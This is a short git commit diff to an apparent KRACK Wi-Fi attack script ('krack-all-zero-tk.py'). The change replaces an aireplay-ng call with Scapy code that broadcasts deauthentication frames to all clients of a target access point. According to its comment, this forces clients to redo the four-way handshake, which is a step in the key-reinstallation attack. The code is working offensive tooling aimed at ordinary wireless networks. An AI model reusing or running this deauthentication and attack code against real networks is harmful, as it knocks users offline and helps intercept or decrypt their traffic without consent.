97b0c6a7e0d58bca0eb9ac16d02b379cf56bc946
611410066 <10sun19991119@gmail.com>
2023-06-01 18:47:33 +0800

    try:

--- krackattack/krack-all-zero-tk.py
+++ krackattack/krack-all-zero-tk.py
@@ -621,10 +621,10 @@ class KRAckAttack():
 		subprocess.check_output(["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
 
 		# deauthenticated 所有 client端，讓 AP 端重新四次交握
-		# dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.apmac, addr3=self.apmac)
-		# deauth = RadioTap()/dot11/Dot11Deauth(reason=3)
-		# self.sock_real.send(deauth, self.netconfig.real_channel)
-		subprocess.call(["aireplay-ng", "-0", "10", "-a", self.apmac, "-c", self.clientmac, self.nic_real_mon])
+		dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.apmac, addr3=self.apmac)
+		deauth = RadioTap()/dot11/Dot11Deauth(reason=3)
+		self.sock_real.send(deauth, self.netconfig.real_channel)
+		# subprocess.call(["aireplay-ng", "-0", "10", "-a", self.apmac, "-c", self.clientmac, self.nic_real_mon])
 
 		# For good measure, also queue a dissasociation to the targeted client on the rogue channel
 		if self.clientmac:
